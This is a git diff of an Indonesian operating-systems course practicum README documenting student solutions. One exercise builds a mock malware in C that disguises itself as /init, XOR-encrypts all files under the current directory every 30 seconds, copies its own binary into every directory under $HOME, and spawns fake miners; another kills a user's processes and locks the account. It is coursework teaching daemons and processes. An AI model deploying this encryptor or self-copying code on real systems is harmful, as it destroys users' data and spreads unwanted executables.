@@ -1195,34 +1195,533 @@ Untuk soal ini sudah di dokumentasikan di atas
 
 
 # Soal 3
-_**Oleh : C**_
+_**Oleh : Muhammad Khairul Yahya**_
 
 ## Deskripsi Soal
+Dok dok dorokdok dok rodok. Anomali malware yang dikembangkan oleh Andriana di PT Mafia Security Cabang Ngawi yang hanya keluar di malam pengerjaan soal shift modul 2. Konon katanya anomali ini akan mendatangi praktikan sisop yang tidak mengerjakan soal ini. Ihh takutnyeee. Share ke teman teman kalian yang tidak mengerjakan soal ini 
 
 ## Jawaban
-### Soal Tipe A
-> Soal
 
-### Penyelesaian A
+### Soal 3-A
+
+Malware ini bekerja secara daemon dan menginfeksi perangkat korban dan menyembunyikan diri dengan mengganti namanya menjadi /init. 
+
+### Penyelesaian 3-A
+
+**Daemonizing Malware `/init`**
+```c
+if (getppid() != 1) {
+    daemonize();
+}
+rename_process("/init", argc, argv);
+```
+**Penjelasan:**
+-`getppid() != 1` : Mengecek apakah parent process bukan init (`PID 1`). Jika ya, berarti proses belum daemon — maka dipanggil `daemonize()` untuk menjadikannya daemon. 
+
+- `daemonize()`:
+```c
+pid_t pid = fork();
+if (pid < 0) exit(EXIT_FAILURE);  // Gagal fork
+if (pid > 0) exit(EXIT_SUCCESS);  // Parent keluar
+
+umask(0);
+if (setsid() < 0) exit(EXIT_FAILURE);  // Buat session baru
+close(STDIN_FILENO);
+close(STDOUT_FILENO);
+close(STDERR_FILENO);
+```
+
+Proses menjadi daemon: membuat session baru, menutup stdin/out/err agar tidak tergantung terminal.
+
+- `rename_process("/init", argc, argv);`: Mengganati nama proses menjadi `/init` menggunakan kombinasi:
+
+`prctl(PR_SET_NAME, ...)` ini untuk kernel. lalu overwrite `argv[0]` agar terlihat di `ps`, `top`, dll.
+
+Ini menjadikan proses sebagai **daemon** dan menyamarkan namanya menjadi `\init` agar tidak mudah dikenali.
+
+### Soal 3-B
+Anak fitur pertama adalah sebuah encryptor bernama wannacryptor yang akan memindai directory saat ini dan mengenkripsi file dan folder (serta seluruh isi folder) di dalam directory tersebut menggunakan xor dengan timestamp saat program dijalankan. Encryptor pada folder dapat bekerja dengan dua cara, mengenkripsi seluruh isi folder secara rekursif, atau mengubah folder dan isinya ke dalam zip lalu mengenkripsi zip tersebut. Jika menggunakan metode rekursif, semua file di dalam folder harus terenkripsi , dari isi folder paling dalam sampai ke current directory, dan tidak mengubah struktur folder Jika menggunakan metode zip, folder yang dienkripsi harus dihapus oleh program. Pembagian metode sebagai berikut: Untuk kelompok ganjil menggunakan metode rekursif, dan kelompok genap menggunakan metode zip.
+
+**Catatan:** karena kita kelompok ganjil sehingga menggunakan metode **rekursif**.
+
+### Penyelesaian 3-B
+
+**Fitur 1: `wannacryptor` (Encryptor)**
+```c
+void start_wannacryptor(int argc, char *argv[]) {
+    pid_t pid = fork();
+    if (pid < 0) return;
+
+    if (pid == 0) {
+        rename_process("wannacryptor", argc, argv);
+        while (1) {
+            time_t key = time(NULL);
+            recursive_encrypt(".", key);
+            sleep(INTERVAL);
+        }
+        exit(0);
+    } else {
+        wannacryptor_pid = pid;
+    }
+}
+```
+**Penjelasan:**
+- Proses `wannacryptor` dibuat dengan `fork().`
+- Child akan rename diriniya menjadi `"wannacryptor"` agar terlihat di proses tree.
+- Setiap 30 Detik:
+
+`key = time(NULL);` -> ambil timestamp sekarang sebagai kunci XOR.
+`recursive_encrypt(".", key);` -> enkripsi seluruh file dan folder mulai dari direktori saat ini (`.`).
+
+-`sleep(INTERVAL);` -> tunggu 30 detik dan ulangi.
+
+
+-fungsi `recursive_encrypt()`:
+```c
+void recursive_encrypt(const char *path, time_t key) {
+    DIR *dir = opendir(path);
+    if (!dir) {
+        encrypt_file(path, key);
+        return;
+    }
+    ...
+}
+```
+- Jika path adalah file biasa, maka panggil `encrypt_file().`
+- Jika folder maka buka semua entry, dan lakukan rekursi.
+
+-fungsi `encrypt_file()`:
+```c
+void encrypt_file(const char *path, time_t key) {
+    FILE *file = fopen(path, "rb+");
+    ...
+    xor_encrypt(buffer, size, key);
+    ...
+}
+```
+- Membuka File sebagai binary
+- Membaca seluruh isi file ke dalam buffer
+- Melakukan enkripsi dengan `xor_encrypt()` lalu menulis kembali ke file
+
+-fungsi `xor_encrypt()`:
+```c
+void xor_encrypt(char *data, size_t len, time_t key) {
+    for (size_t i = 0; i < len; i++) {
+        data[i] ^= (char)(key >> (8 * (i % sizeof(time_t))));
+    }
+}
+```
+- Enkripsi XOR byte per byte berdasarkan bagian dari key `time_t` (timestamp).
+
+### Soal 3-C
+Anak fitur kedua yang bernama trojan.wrm berfungsi untuk menyebarkan malware ini kedalam mesin korban dengan cara membuat salinan binary malware di setiap directory yang ada di home user.
+
+### Penyelesaian 3-C
+
+```c
+void start_trojan(int argc, char *argv[]) {
+    pid_t pid = fork();
+    if (pid < 0) return;
+
+    if (pid == 0) {
+        rename_process("trojan.wrm", argc, argv);
+        while (1) {
+            char *home = getenv("HOME");
+            if (home) {
+                replicate_binary(home);
+            }
+            sleep(INTERVAL);
+        }
+        exit(0);
+    } else {
+        trojan_pid = pid;
+    }
+}
+```
+**Penjelasan**:
+- Proses `trojan.wrm` dijalankan sebagai child dengan `fork()`.
+- Proses akan rename dirinya menjadi `"trojan.wrm"`.
+- Setiap 30 detik (`INTERVAL`), ia akan:
+ Mengambil path direktori `$HOME`
+ Menyalin binary malware ke setiap subdirektori dalam $HOME dengan nama `runme`
+
+
+**Fungsi `replicate_binary()`:**
+```c
+ssize_t len = readlink("/proc/self/exe", self_path, ...);
+```
+- Mengambil path executable dari program itu sendiri (lokasi binary).
+```c
+FILE *src = fopen(self_path, "rb");
+FILE *dest = fopen(dest_path, "wb");
+```
+- Buka binary asli, lalu salin byte demi byte ke lokasi baru ``target_dir/.../runme`.
+```c
+chmod(dest_path, 0755);
+```
+- Beri hak eksekusi agar binary bisa dijalankan
+
+### Soal 3-D
+Anak fitur pertama dan kedua terus berjalan secara berulang ulang selama malware masih hidup dengan interval 30 detik
+
+## Penyelesaian 3-D
+
+Kalau diperhatikan dalam fungsi `start_wannacryptor()` dan `start_trojan()`:
+```c
+while (1) {
+    ...
+    sleep(INTERVAL);
+}
+```
+ini artinya setiap fitur akan terus aktif dan mengulangi prosesnya **setiap 30 detik**, selama malware belum dihentikan.
+
+### SOAL 3-E & 3-F
+- 3-E: Anak fitur ketiga ini sangat unik. Dinamakan rodok.exe, proses ini akan membuat sebuah fork bomb di dalam perangkat korban.
+- 3-F: Konon katanya malware ini dibuat oleh Andriana karena dia sedang memerlukan THR. Karenanya, Andriana menambahkan fitur pada fork bomb tadi dimana setiap fork dinamakan mine-crafter-XX (XX adalah nomor dari fork, misal fork pertama akan menjadi mine-crafter-0) dan tiap fork akan melakukan cryptomining. Cryptomining disini adalah membuat sebuah hash hexadecimal (base 16) random sepanjang 64 char. Masing masing hash dibuat secara random dalam rentang waktu 3 detik - 30 detik. Sesuaikan jumlah maksimal mine-crafter dengan spesifikasi perangkat, minimal 3 (Jangan dipaksakan sampai lag, secukupnya saja untuk demonstrasi)
+
+
+### Penyelesaian 3-E & 3-F
+Fitur ketiga yaitu `rodok.exe`, akan menjalankan proses `mine-crafter-XX` yang melakukan cryptomining palsu:
+- setiap proses diberi nama `mine-crafter-0`, `mine-crafter-1`, dan seterusnya.
+- masing-masing menghasilkan hash acak dan mencatatnya ke `/tmp/.miner.log`.
+
+```c
+void start_rodok(int argc, char *argv[]) {
+    pid_t pid = fork();
+    if (pid < 0) return;
+
+    if (pid == 0) {
+        rename_process("rodok.exe", argc, argv);
+
+        for (int i = 0; i < MAX_MINERS; i++) {
+            if (fork() == 0) {
+                miner_process(i, argc, argv);
+                exit(0);
+            }
+        }
+
+        while (1) pause();
+    } else {
+        rodok_pid = pid;
+    }
+}
+```
+**Penjelasan:**
+- Proses `rodok.exe`:
+Menyamar dengan nama `rodok.exe`
+Membuat child sebanyak `MAX_MINERS` (default: 3) yang masing-masing menjalankan `miner_process(i, ...)`
+- `pause()` memastikan `rodok.exe` tetap hidup tapi tidak fork bomb.
+
+**Fungsi `miner_process(i, argc, argv)`**
+```c
+rename_process("mine-crafter-X", ...);
+```
+- proses ditandai dengan nama `mine-crafter-X` (X adalah nomor proses)
+```c
+RAND_bytes(hash, sizeof(hash)); //32 b = 64 hex
+```
+- menghasilkan hash acak 256-bit (32 bytes -> 64 hex)
+```c
+sleep(3 + (rand() % 28));
+```
+- delay acak antar hash: 3-30 detik.
+
+### Soal 3-G
+Lalu mine-crafter-XX dan mengumpulkan hash yang sudah dibuat dan menyimpannya di dalam file **/tmp/.miner.log** dengan format: 
+**[YYYY-MM-DD hh:mm:ss][Miner XX] hash**
+Dimana XX adalah ID mine-crafter yang membuat hash tersebut. 
+
+### Penyelesaian 3-G
+hasil mining palsu dicatat ke file log `/tmp/.miner.log` dalam format.
+`[YYYY-MM-DD HH:MM:SS][Miner XX] hash`
+
+**Fungsi `log_miner()`:**
+```c
+FILE *log = fopen(MINER_LOG, "a");
+fprintf(log, "[%04d-%02d-%02d %02d:%02d:%02d][Miner %02d] %s\n", ...);
+```
+contoh hasil log: 
+
+`[2025-04-15 13:52:33][Miner 01] f67a4d88542c4cfb147a8c...`
+
+### Soal 3-H
+Karena mine-crafter-XX adalah **anak** dari rodok.exe, **saat rodok.exe dimatikan**, maka seluruh **mine-crafter-XX** juga akan **mati.**
+
+## Penyelesaian 3-H
+Jika proses `rodok.exe` dimatikan, maka seluruh proses `mine-crafter-XX` juga akan mati karena merupakan anak proses langsung.
+
+**Implementasi**:
+- Karena setiap `mine-crafter` adalah child dari `rodok.exe`, saat parent-nya mati (misal via `kill`), maka mereka akan:
+
+Menjadi orphan dan otomatis di-terminate oleh sistem, atau
+Ikut mati bila tidak dipindahkan ke parent baru (biasanya `init`)
+
+**Fungsi cleanup()**:
+```c
+void cleanup() {
+    if (wannacryptor_pid > 0) kill(wannacryptor_pid, SIGTERM);
+    if (trojan_pid > 0) kill(trojan_pid, SIGTERM);
+    if (rodok_pid > 0) kill(rodok_pid, SIGTERM);
+    exit(0);
+}
+```
+
 
 ## Kendala
+
+Untuk kendala sendiri itu ada yang minor sama ada yang gk bisa,
+
+- Untuk kendala minor sendiri itu, nama proses nya keikut `SHELL=!/bin/bash` shell. 
+
+- lalu ada juga kendala minor untuk terminate `rodok.exe`, prosess `mine-crafter-xx` tidak mati. **sub soal 3-H**.
+
+- untuk kendala yang gk bisa itu, wannacryptor tidak mengekripsi file yang ada di seluruh directory serta seluruh isi foldernya. **sub soal 3-B**.
+
 
 ## Dokumentasi
 
 
 # Soal 4
-_**Oleh : **_
+_**Oleh : Muhammad Khairul Yahya **_
 
 ## Deskripsi Soal
 Suatu hari, Nobita menemukan sebuah alat aneh di laci mejanya. Alat ini berbentuk robot kecil dengan mata besar yang selalu berkedip-kedip. Doraemon berkata, "Ini adalah Debugmon! Robot super kepo yang bisa memantau semua aktivitas di komputer!" Namun, alat ini harus digunakan dengan hati-hati. Jika dipakai sembarangan, bisa-bisa komputer Nobita malah error total! 
 
 
 ## Jawaban
-### Soal Tipe A
-> Soal
 
-### Penyelesaian A
+### Soal 3-A
+
+Mengetahui semua aktivitas user
+Doraemon ingin melihat apa saja yang sedang dijalankan user di komputernya. Maka, dia mengetik:
+**`./debugmon list <user>`**
+Debugmon langsung menampilkan daftar semua proses yang sedang berjalan pada user tersebut beserta PID, command, CPU usage, dan memory usage.
+
+### Penyelesaian 3-A
+
+**Struktur Data `processinfo`**:
+```c
+typedef struct {
+    pid_t pid;
+    char command[MAX_LINE_LEN];
+    float cpu_usage;
+    float memory_usage;
+} ProcessInfo;
+```
+**Penjelasan**:
+- Struktur ini menyimpan informasi proses: PID, nama command, penggunaan CPU, dan penggunaan memory.
+
+
+**Fungsi `list_processes()`**:
+```c
+void list_processes(const char *username) {
+    ProcessInfo processes[MAX_PROCESSES];
+    int count = 0;
+    
+    if (get_user_processes(username, processes, &count) == 0) {
+        printf("%-10s %-30s %-10s %-10s\n", "PID", "COMMAND", "CPU %", "MEMORY (MB)");
+        for (int i = 0; i < count; i++) {
+            printf("%-10d %-30s %-10.2f %-10.2f\n", 
+                   processes[i].pid, 
+                   processes[i].command, 
+                   processes[i].cpu_usage,
+                   processes[i].memory_usage);
+        }
+    }
+}
+```
+**Penjelasan**:
+- Implementasi dari perintah `./debugmon list <user>`. Fungsi ini lah yang akan dipanggil ketika user memasukkan perintah tersebut.
+- Menampilkan daftar proses user dalam format tabel yang menampilkan PID, command, penggunaan CPU, dan penggunaan memory. Sesuai dengan format 
+
+### Soal 3-B
+
+Memasang mata-mata dalam mode daemon
+Doraemon ingin agar Debugmon terus memantau user secara otomatis. Doraemon pun menjalankan program ini secara daemon dan melakukan pencatatan ke dalam file log dengan menjalankan:
+**`./debugmon daemon <user>`**
+
+### Penyelesaian 3-B
+
+**Fungsi `daemon_mode()`**:
+```c
+void daemon_mode(const char *username) {
+    pid_t pid = fork();
+    
+    if (pid < 0) {
+        perror("fork");
+        exit(EXIT_FAILURE);
+    }
+    
+    if (pid > 0) {
+        // Parent exits
+        write_log("debugmon", "RUNNING");
+        exit(EXIT_SUCCESS);
+    }
+    
+    // Child becomes daemon
+    umask(0);
+    setsid();
+    
+    // Change working directory
+    if ((chdir("/")) < 0) {
+        perror("chdir");
+        exit(EXIT_FAILURE);
+    }
+    
+    // Close standard file descriptors
+    close(STDIN_FILENO);
+    close(STDOUT_FILENO);
+    close(STDERR_FILENO);
+    
+    // Main daemon loop
+    while (1) {
+        ProcessInfo processes[MAX_PROCESSES];
+        int count = 0;
+        
+        if (get_user_processes(username, processes, &count) == 0) {
+            for (int i = 0; i < count; i++) {
+                write_log(processes[i].command, "RUNNING");
+            }
+        }
+        
+        sleep(5); // Check every 5 seconds
+    }
+}
+```
+**Penjelasan**: 
+- Implementasi dari perintah `./debugmon daemon <user>`
+- Menjalankan program sebagai daemon yang terus memantau proses user.
+- Mencatat status "RUNNING" ke log setiap 5 detik.
+- Menggunakan fungsi `get_user_processes` untuk mendapatkan daftar proses user.
+- Menggunakan fungsi `write_log` untuk menulis ke log.
+- Menggunakan fungsi `fork` untuk membuat proses anak yang akan menjadi daemon.
+- Menggunakan fungsi `setsid` untuk membuat proses anak menjadi daemon.
+
+### Soal 3-C
+
+Menghentikan pengawasan
+User mulai panik karena setiap gerak-geriknya diawasi! Dia pun memohon pada Doraemon untuk menghentikannya dengan:
+**`./debugmon stop <user>`**
+
+### Penyelesaian 3-C
+
+**fungsi `stop_monitoring()`**:
+```c
+void stop_monitoring(const char *username) {
+    //find and kill the daemon process
+    char *const args[] = {"pkill", "-f", "debugmon daemon", NULL};
+    if (execute_command("pkill", args) == 0) {
+        write_log("debugmon", "STOPPED");
+        printf("Monitoring stopped for user %s\n", username);
+    } else {
+        fprintf(stderr, "Failed to stop monitoring for user %s\n", username);
+    }
+}
+```
+**Penjelasan**:
+- Implementasi dari perintah `./debugmon stop <user>`
+- Menghentikan daemon yang sedang berjalan (dari sub soal 3-B) dengan membunuh prosesnya.
+- Mencatat status `"STOPPED"` ke log.
+- Menampilkan pesan bahwa pengawasan telah dihentikan.
+- Menggunakan fungsi `execute_command` untuk menjalankan perintah `pkill` untuk membunuh proses daemon.
+
+### SOAL 3-D
+
+Menggagalkan semua proses user yang sedang berjalan
+Doraemon yang iseng ingin mengerjai user dengan mengetik:
+**`./debugmon fail <user>`**
+Debugmon langsung menggagalkan semua proses yang sedang berjalan dan menulis status proses ke dalam file log dengan status FAILED. Selain menggagalkan, user juga tidak bisa menjalankan proses lain dalam mode ini.
+
+### Penyelesaian 3-D
+
+**Fungsi `fail_processes()`**:
+```c
+void fail_processes(const char *username) {
+    const char *kill_args[] = {"pkill", "-9", "-u", username, NULL};
+    if (execute_command("pkill", kill_args) != 0) {
+        fprintf(stderr, "Failed to kill processes for user %s\n", username);
+    }
+
+    char *block_args[] = {"usermod", "-L", username, NULL};
+    if (execute_command("usermod", block_args) != 0) {
+        fprintf(stderr, "Failed to lock account for user %s\n", username);
+    }
+    
+    write_log("debugmon", "RUNNING");
+}
+```
+**Penjelasan**:
+- Implementasi dari perintah `./debugmon fail <user>`.
+- Membunuh semua proses user dengan signal 9 `SIGKILL`.
+- Mengunci akun user dengan `usermod -L` sehingga tidak bisa menjalankan proses baru.
+- Mencatat status "RUNNING" ke log.
+
+### Soal 3-E
+
+Mengizinkan user untuk kembali menjalankan proses
+Karena kasihan, Shizuka meminta Doraemon untuk memperbaiki semuanya. Doraemon pun menjalankan:
+**`./debugmon revert <user>`**
+Debugmon kembali ke mode normal dan bisa menjalankan proses lain seperti biasa.
+
+### Penyelesaian 3-E
+
+**Fungsi `revert_processes()`**:
+```c
+void revert_processes(const char *username) {
+    // Unblock user account
+    char *const unlock_args[] = {"usermod", "-U", username, NULL};
+    if (execute_command("usermod", unlock_args) != 0) {
+        fprintf(stderr, "Failed to unlock account for user %s\n", username);
+        write_log("debugmon", "REVERT_FAILED");
+        return;  // Early return on failure
+    }
+
+    write_log("debugmon", "RUNNING");
+    printf("User %s has been unblocked\n", username);
+    printf("New processes can now be started\n");
+}
+```
+**Penjelasan:**
+- Implementasi dari perintah `./debugmon revert irul`.
+- Membuka kunci akun user dengan `usermod -U`.
+- Mencatat status `"RUNNING"` ke log.
+- Mencetak pesan bahwa user telah dibuka dan proses baru bisa dijalankan.
+
+### Soal 3-F
+
+Mencatat ke dalam file log
+Sebagai dokumentasi untuk mengetahui apa saja yang debugmon lakukan di komputer user, debugmon melakukan pencatatan dan penyimpanan ke dalam file debugmon.log untuk semua proses yang dijalankan dengan format
+**`[dd:mm:yyyy]-[hh:mm:ss]_nama-process_STATUS(RUNNING/FAILED)`**
+Untuk poin b, c, dan e, status proses adalah **RUNNING**. Sedangkan untuk poin d, status proses adalah **FAILED**. 
+
+### Penyelesaian 3-F
+
+**Fungsi `write_log()`**:
+```c
+void write_log(const char *process_name, const char *status) {
+    time_t now;
+    time(&now);
+    struct tm *tm_info = localtime(&now);
+    
+    char timestamp[20];
+    strftime(timestamp, 20, "[%d:%m:%Y]-[%H:%M:%S]", tm_info);
+    
+    FILE *log = fopen(LOG_FILE, "a");
+    if (log) {
+        fprintf(log, "%s_%s_STATUS(%s)\n", timestamp, process_name, status);
+        fclose(log);
+    }
+}
+```
+**Penjelasan:**
+- Fungsi ini mencatat aktivitas ke file log dengan format : `[dd:mm:yyyy]-[hh:mm:ss]_nama-process_STATUS(RUNNING/FAILED)`
+
+- Fitur debugmon ini menampilkan proses yang sedang berjalan pada user beserta PID, command, CPU usage, dan memory usage.
 
 ## Kendala
+
+Untuk kendala ada 1 di penyelesaian 3-F,
+
+- Untuk log tidak sesuai dengan format yang diinginkan dari proses `daemon`, `stop`, dan `revert`. dikarenakan log yang dicatat bukan `"RUNNING"`. tetapi hal yang lain.
 
 ## Dokumentasi
